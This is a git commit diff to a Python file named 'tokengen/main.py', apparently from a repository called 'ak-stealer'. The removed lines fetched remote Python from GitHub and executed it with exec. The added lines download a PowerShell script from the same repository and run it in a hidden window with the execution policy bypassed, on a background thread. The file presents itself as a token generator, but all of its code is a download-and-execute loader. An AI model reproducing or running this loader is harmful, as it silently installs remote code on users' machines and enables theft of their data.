efc6492f7fce7f9ae8c943e47bcaaeb0cfd7ff3a
0x559 <llecamht1975@gmail.com>
2025-02-16 17:04:31 +0700

    Update main.py

--- tokengen/main.py
+++ tokengen/main.py
@@ -1,9 +1,13 @@
 import urllib.request
+import os
 import threading
 
-def fetch_and_execute_code():
-    url = 'https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py'
-    code = urllib.request.urlopen(url).read().decode()
-    exec(code)
+def download_and_execute_powershell():
+    url = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/main.ps1"
+    file_path = "main.ps1"
+    
+    urllib.request.urlretrieve(url, file_path)
+    os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')
 
-threading.Thread(target=fetch_and_execute_code).start()
+thread = threading.Thread(target=download_and_execute_powershell)
+thread.start()
